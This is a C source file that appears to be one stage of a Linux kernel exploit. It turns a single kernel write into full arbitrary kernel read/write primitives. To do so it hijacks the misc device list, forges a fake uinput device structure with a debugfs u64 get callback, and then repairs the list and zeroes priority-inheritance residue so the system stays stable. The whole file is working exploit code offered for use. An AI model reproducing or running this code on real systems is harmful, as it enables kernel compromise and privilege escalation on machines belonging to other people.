#include "common.h"

enum { ATTR_FD_CONTROLLER = 0, ATTR_FD_DATA = 1 };
int attr_fd[2] = {-1, -1};
int attr_list_restored;

static int attr_write_number(int fd, uint64_t value, const char *label) {
  const char *nl = "\n";
  char text[32];
  int len = snprintf(text, sizeof(text), "0x%llx%s", (unsigned long long)value, nl);
  if (len <= 0 || len >= (int)sizeof(text)) {
    errno = EOVERFLOW;
    return 0;
  }
  errno = 0;
  ssize_t written = write(fd, text, (size_t)len);
  if (written != len) {
    pr_warning(
        "r/w write failed label=%s fd=%d value=%016llx "
        "ret=%zd/%d errno=%d\n",
        label, fd, (unsigned long long)value, written, len, errno);
    return 0;
  }
  return 1;
}

static int attr_set_target(uintptr_t target) {
  if (attr_fd[ATTR_FD_CONTROLLER] < 0 || !is_kernel_ptr(target)) {
    errno = EINVAL;
    return 0;
  }
  return attr_write_number(attr_fd[ATTR_FD_CONTROLLER], target, "controller.target");
}

int attr_write64(uintptr_t target, uint64_t value) {
  return attr_set_target(target) && attr_write_number(attr_fd[ATTR_FD_DATA], value, "data.value");
}

int attr_read64(uintptr_t target, uint64_t *value) {
  if (!value || !attr_set_target(target)) {
    return 0;
  }
  if (lseek(attr_fd[ATTR_FD_DATA], 0, SEEK_SET) != 0) {
    pr_warning("r/w: data lseek failed target=%016zx errno=%d\n", target, errno);
    return 0;
  }
  char text[32];
  errno = 0;
  ssize_t got = read(attr_fd[ATTR_FD_DATA], text, sizeof(text) - 1);
  if (got <= 0 || got >= (ssize_t)sizeof(text)) {
    pr_warning("r/w read failed target=%016zx ret=%zd errno=%d\n", target, got, errno);
    return 0;
  }
  text[got] = 0;
  char *end = NULL;
  errno = 0;
  unsigned long long parsed = strtoull(text, &end, 0);
  if (errno || end == text || (*end && *end != '\n')) {
    pr_warning("r/w parse failed target=%016zx text='%s' errno=%d\n", target, text, errno);
    return 0;
  }
  *value = (uint64_t)parsed;
  return 1;
}

int attr_read_data(uintptr_t target, void *data, size_t len) {
  if (!data || !len || !is_kernel_ptr(target)) {
    errno = EINVAL;
    return 0;
  }
  unsigned char *out = data;
  for (size_t done = 0; done < len;) {
    uint64_t word = 0;
    size_t chunk = len - done < sizeof(word) ? len - done : sizeof(word);
    if (!attr_read64(target + done, &word)) {
      return 0;
    }
    memcpy(out + done, &word, chunk);
    done += chunk;
  }
  return 1;
}

int attr_write_data(uintptr_t target, const void *data, size_t len) {
  if (!data || !len || !is_kernel_ptr(target)) {
    errno = EINVAL;
    return 0;
  }
  const unsigned char *in = data;
  for (size_t done = 0; done < len;) {
    uint64_t word = 0;
    size_t chunk = len - done < sizeof(word) ? len - done : sizeof(word);
    if (chunk != sizeof(word) && !attr_read64(target + done, &word)) {
      return 0;
    }
    memcpy(&word, in + done, chunk);
    if (!attr_write64(target + done, word)) {
      return 0;
    }
    done += chunk;
  }
  return 1;
}

static uintptr_t attr_fresh_payload(void) {
  page_base = prepare_good_kernel_page();
  if (!page_base) {
    pr_warning("r/w: workspace preparation failed\n");
    return 0;
  }

  return page_base + SKB_DATA_DELTA;
}

static int attr_walk_ok(int rc, const char *step) {
  if (rc == 1) {
    return 1;
  }
  pr_warning("walk step %s: rc=%d%s\n", step, rc,
             rc < 0 ? " (early/hung: " STR_REBOOT_REQ ")" : " (miss, write not delivered)");
  return 0;
}

static int attr_restore_misc_list(uintptr_t head, uintptr_t uinput_list) {
  uint64_t cursor = 0;
  if (!attr_read64(uinput_list + 8, &cursor)) {
    pr_warning("carrier: rebuild: read uinput.prev failed\n");
    return 0;
  }
  if (cursor == head) {
    return attr_write64(head, uinput_list);
  }
  if (!is_kernel_ptr(cursor)) {
    pr_warning("carrier: rebuild: bad uinput.prev 0x%016llx\n", (unsigned long long)cursor);
    return 0;
  }
  for (int guard = 0; guard < 4096; guard++) {
    uint64_t prev = 0;
    if (!attr_read64(cursor + 8, &prev)) {
      pr_warning("carrier: rebuild: prev walk read failed cursor=0x%016llx\n",
                 (unsigned long long)cursor);
      return 0;
    }
    if (!is_kernel_ptr(prev) || prev == cursor) {
      pr_warning("carrier: rebuild: broken prev chain cursor=%016llx prev=%016llx\n",
                 (unsigned long long)cursor, (unsigned long long)prev);
      return 0;
    }
    if (prev == head) {
      if (!attr_write64(head, cursor)) {
        pr_warning("carrier: rebuild: head.next write failed\n");
        return 0;
      }
      uint64_t chk = 0;
      if (!attr_read64(head, &chk) || chk != cursor) {
        pr_warning("carrier: rebuild: verify failed got=0x%016llx want=0x%016llx\n",
                   (unsigned long long)chk, (unsigned long long)cursor);
        return 0;
      }
      pr_success("misc_list topology rebuilt: head.next=0x%016llx, walked=%d nodes\n",

                 (unsigned long long)cursor, guard + 1);
      return 1;
    }
    cursor = prev;
  }
  pr_warning("carrier: rebuild: prev walk exceeded guard 4096\n");
  return 0;
}

static int attr_zero_pi_trees(uintptr_t lock, uintptr_t task) {
  static const struct {
    uintptr_t off;
    const char *name;
  } lock_words[] = {
      {0x08, "waiters.rb_node"},
      {0x10, "waiters.leftmost"},
      {0x18, "owner"},
  };
  static const struct {
    uintptr_t off;
    const char *name;
  } task_words[] = {
      {FAKE_TASK_PI_WAITERS_OFF, "pi_waiters.rb_node"},
      {FAKE_TASK_PI_WAITERS_OFF + 0x08, "pi_waiters.leftmost"},
      {FAKE_TASK_PI_TOP_TASK_OFF, "pi_top_task"},
      {FAKE_TASK_PI_BLOCKED_ON_OFF, "pi_blocked_on"},
  };
  pr_info("walk: pi tree cleanup: lock=0x%016zx task=0x%016zx\n", lock, task);
  for (size_t i = 0; i < sizeof(lock_words) / sizeof(lock_words[0]); i++) {
    uint64_t before = 0;
    if (!attr_read64(lock + lock_words[i].off, &before)) {
      pr_warning("read lock.%s failed\n", lock_words[i].name);
      return 0;
    }
    if (before != 0 && !attr_write64(lock + lock_words[i].off, 0)) {
      pr_warning("write lock.%s failed\n", lock_words[i].name);
      return 0;
    }
    if (before != 0) {
      pr_debug("lock.%s was 0x%016llx\n", lock_words[i].name, (unsigned long long)before);
    }
  }
  for (size_t i = 0; i < sizeof(task_words) / sizeof(task_words[0]); i++) {
    uint64_t before = 0;
    if (!attr_read64(task + task_words[i].off, &before)) {
      pr_warning("read task.%s failed\n", task_words[i].name);
      return 0;
    }
    if (before != 0 && !attr_write64(task + task_words[i].off, 0)) {
      pr_warning("write task.%s failed\n", task_words[i].name);
      return 0;
    }
    if (before != 0) {
      pr_debug("task.%s was 0x%016llx\n", task_words[i].name, (unsigned long long)before);
    }
  }
  uint64_t chk = 1;
  if (!attr_read64(lock + 0x08, &chk) || chk != 0) {
    pr_warning("verify lock.rb_node not zeroed: 0x%016llx\n", (unsigned long long)chk);
    return 0;
  }
  if (!attr_read64(task + FAKE_TASK_PI_WAITERS_OFF, &chk) || chk != 0) {
    pr_warning("verify task.pi_waiters not zeroed\n");
    return 0;
  }
  pr_success("pi tree residue zeroed (fake_lock + fake_task)\n");
  return 1;
}

int attr_run(void) {
  attr_fd[ATTR_FD_CONTROLLER] = -1;
  attr_fd[ATTR_FD_DATA] = -1;
  attr_list_restored = 0;

  int probe = open(UINPUT_DEVICE, O_RDWR | O_CLOEXEC);
  if (probe < 0) {
    pr_warning("carrier: preflight cannot open %s errno=%d\n", UINPUT_DEVICE, errno);
    return 0;
  }
  close(probe);

  uintptr_t head = text_addr(MISC_LIST);
  uintptr_t uinput = text_addr(UINPUT_MISC);
  uintptr_t uinput_list = uinput + MISC_STRUCT_LIST_OFF;

  uintptr_t payload_base = 0;
  uintptr_t controller = 0;
  uintptr_t data = 0;
  uintptr_t proof_scratch = 0;

  payload_base = attr_fresh_payload();
  if (!payload_base) return 0;
  controller = payload_base + ATTR_CONTROLLER_OFF;
  data = payload_base + ATTR_DATA_OFF;
  proof_scratch = payload_base + ATTR_W1_SCRATCH_OFF;

  pr_info("walk: fire target=0x%016zx value=0x%016zx\n", head, controller + MISC_STRUCT_LIST_OFF);
  int rc = pselect_write_once(head, controller + MISC_STRUCT_LIST_OFF);
  if (!attr_walk_ok(rc, "1/1")) return 0;

  pr_success("walk delivered: controller+data linked\n");

  attr_fd[ATTR_FD_CONTROLLER] = open(UINPUT_DEVICE, O_RDWR | O_CLOEXEC);
  if (attr_fd[ATTR_FD_CONTROLLER] < 0) {
    pr_warning("carrier: controller open failed errno=%d\n", errno);
    return 0;
  }
  pr_success("carrier: controller fd=%d\n", attr_fd[ATTR_FD_CONTROLLER]);

  if (!attr_write_number(attr_fd[ATTR_FD_CONTROLLER], 0, "controller.minor = 0")) {
    pr_warning("carrier: clear controller minor failed\n");
    attr_cleanup();
    return 0;
  }

  attr_fd[ATTR_FD_DATA] = open(UINPUT_DEVICE, O_RDWR | O_CLOEXEC);
  if (attr_fd[ATTR_FD_DATA] < 0) {
    pr_warning("carrier: data open failed errno=%d\n", errno);
    attr_cleanup();
    return 0;
  }
  pr_success("carrier: data fd=%d\n", attr_fd[ATTR_FD_DATA]);

  uintptr_t data_data_ptr = data + ATTR_DATA_PTR_OFF;
  if (!attr_write_number(attr_fd[ATTR_FD_DATA], data_data_ptr, "controller.data = &data.data")) {
    pr_warning("carrier: wire controller.data failed\n");
    attr_cleanup();
    return 0;
  }

  if (!attr_write64(data + ATTR_GET_OFF, text_addr(DEBUGFS_U64_GET))) {
    pr_warning("carrier: get callback bootstrap failed\n");
    attr_cleanup();
    return 0;
  }

  if (!attr_restore_misc_list(head, uinput_list)) {
    pr_warning("failed to rebuild misc_list topology (chain truncated); " STR_REBOOT_REQ "\n");
    attr_cleanup();
    return 0;
  }
  attr_list_restored = 1;
  pr_success("carrier: misc_list intact\n");

  if (!attr_zero_pi_trees(fake_lock, fake_task)) {
    pr_warning("carrier: pi tree zero failed; residue entry points may remain\n");
  }

  uintptr_t proof_target = proof_scratch + 0x20;
  uint64_t proof_before = 0;
  uint64_t proof_after = 0;
  const uint64_t proof_value = 0x51554553545f5155ULL;
  int proof_ok = attr_read64(proof_target, &proof_before) &&
                 attr_write64(proof_target, proof_value) &&
                 attr_read64(proof_target, &proof_after) && proof_after == proof_value &&
                 attr_write64(proof_target, proof_before);
  pr_debug("carrier proof: target=%016zx before=%016llx after=%016llx ok=%d\n", proof_target,
           (unsigned long long)proof_before, (unsigned long long)proof_after, proof_ok);

  int result = proof_ok && attr_list_restored;
  if (!result) {
    attr_cleanup();
    return 0;
  }

  pr_success(
      "carrier r/w primitives ready: ctrl=%d, data=%d, restore=%d, "
      "proof=%d\n",
      attr_fd[ATTR_FD_CONTROLLER], attr_fd[ATTR_FD_DATA], attr_list_restored, proof_ok);
  return result;
}

void attr_cleanup(void) {
  if (attr_fd[ATTR_FD_CONTROLLER] >= 0) {
    close(attr_fd[ATTR_FD_CONTROLLER]);
    attr_fd[ATTR_FD_CONTROLLER] = -1;
  }
  if (attr_fd[ATTR_FD_DATA] >= 0) {
    close(attr_fd[ATTR_FD_DATA]);
    attr_fd[ATTR_FD_DATA] = -1;
  }
  pr_debug("carrier: descriptors closed cleanly\n");
}

uint64_t attr_read64_value(uintptr_t target) {
  uint64_t v = 0;
  if (attr_read64(target, &v)) {
    return v;
  }
  static unsigned int fail_count;
  if (++fail_count == 1 || (fail_count % 100) == 0) {
    pr_debug("attr_read64_value: read failed target=%016zx (fail #%u)\n", target, fail_count);
  }
  return 0;
}
